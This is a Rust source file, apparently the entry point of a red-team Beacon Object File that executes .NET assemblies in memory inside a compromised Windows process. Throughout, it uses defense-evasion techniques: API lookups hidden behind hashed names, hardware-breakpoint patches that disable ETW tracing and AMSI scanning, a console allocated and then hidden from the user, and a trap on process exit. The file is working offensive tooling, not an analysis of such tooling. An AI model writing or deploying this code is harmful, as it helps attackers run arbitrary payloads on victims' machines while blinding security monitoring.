//! Senjata-Execute-Assembly BOF — entry point.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod clr;
#[cfg(target_os = "windows")]
pub mod clr_netfx;
#[cfg(target_os = "windows")]
pub mod clr_core;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub mod io;
pub mod pe_parser;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::eprintln!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

/// If the host process has no console attached, AllocConsole creates one and
/// ShowWindow(SW_HIDE) hides it immediately. Prevents a visible CMD popup
/// when the loaded assembly first uses `Console.WriteLine` (the .NET runtime
/// would otherwise auto-allocate a visible console).
#[cfg(target_os = "windows")]
unsafe fn ensure_hidden_console() {
    unsafe {
        let kbase = match opsec_peb::resolve_module(opsec_strcrypt::hash!("kernelbase.dll")) {
            Some(m) => m,
            None => return,
        };
        let get_console_window = match opsec_peb::resolve_export(
            kbase,
            opsec_strcrypt::hash!("GetConsoleWindow"),
        ) {
            Some(f) => f,
            None => return,
        };
        let alloc_console = match opsec_peb::resolve_export(
            kbase,
            opsec_strcrypt::hash!("AllocConsole"),
        ) {
            Some(f) => f,
            None => return,
        };
        type GetWinFn = unsafe extern "system" fn() -> *mut core::ffi::c_void;
        type AllocFn = unsafe extern "system" fn() -> i32;
        let get_win: GetWinFn = core::mem::transmute(get_console_window);
        let alloc: AllocFn = core::mem::transmute(alloc_console);

        if !get_win().is_null() {
            // Console already attached — nothing to do.
            return;
        }
        if alloc() == 0 {
            return;
        }
        // Hide the freshly-allocated console.
        let user32_w: [u16; 11] = [0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0];
        if !crate::clr_netfx_console_loadlib(&user32_w) {
            return;
        }
        let user32 = match opsec_peb::resolve_module(opsec_strcrypt::hash!("user32.dll")) {
            Some(m) => m,
            None => return,
        };
        let show_window = match opsec_peb::resolve_export(
            user32,
            opsec_strcrypt::hash!("ShowWindow"),
        ) {
            Some(f) => f,
            None => return,
        };
        type ShowFn = unsafe extern "system" fn(*mut core::ffi::c_void, i32) -> i32;
        let show: ShowFn = core::mem::transmute(show_window);
        const SW_HIDE: i32 = 0;
        let wnd = get_win();
        if !wnd.is_null() {
            let _ = show(wnd, SW_HIDE);
        }
    }
}

/// LoadLibrary user32 via kernelbase. Returns true if loaded.
#[cfg(target_os = "windows")]
unsafe fn clr_netfx_console_loadlib(name_w: &[u16]) -> bool {
    unsafe {
        if opsec_peb::resolve_module(opsec_strcrypt::hash!("user32.dll")).is_some() {
            return true;
        }
        let kbase = match opsec_peb::resolve_module(opsec_strcrypt::hash!("kernelbase.dll")) {
            Some(m) => m,
            None => return false,
        };
        let ll = match opsec_peb::resolve_export(kbase, opsec_strcrypt::hash!("LoadLibraryW")) {
            Some(f) => f,
            None => return false,
        };
        type LL = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
        let f: LL = core::mem::transmute(ll);
        !f(name_w.as_ptr()).is_null()
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    unsafe {
        // Allocate + hide a console so the .NET runtime doesn't pop up a
        // visible CMD window when the loaded assembly uses Console.WriteLine.
        ensure_hidden_console();
        // Multi-file mode (a.mode == 1) skips PE parsing — the input is a
        // bundle, not a single assembly. Caller is responsible for binary
        // compatibility. Single-file mode parses normally.
        let asm_info = if a.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => BofError::ArchMismatch,
                pe_parser::Error::TargetFrameworkUnknown => BofError::TargetFrameworkUnknown,
                other => BofError::PeParse(other),
            })?
        };

        let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
        let _etw = if a.etw {
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exp_h = opsec_strcrypt::hash!("NtTraceControl");
            let target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exp_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exp_h,
                })?;
            Some(
                engine
                    .install_rip_ret(target as usize, 0)
                    .map_err(BofError::Hwbp)?,
            )
        } else {
            None
        };

        let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;

        let _amsi = if a.amsi {
            Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
        } else {
            None
        };

        // save_cleanup_point acts like setjmp: exit-trap VEH redirects back here.
        let mut invoked = false;
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        if !invoked {
            invoked = true;

            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(BofError::Hwbp)?;

            let dispatch_result = clr::dispatch(
                &asm_info, &a.asm_bytes,
                &a.app_domain, &a.asm_args, a.entry_point,
                a.mode, &a.main_name,
            );
            // Always drain stdout, even on error — the assembly may have
            // printed diagnostic info before throwing.
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
            dispatch_result?;
        }
        let _ = invoked;
    }
    Ok(())
}
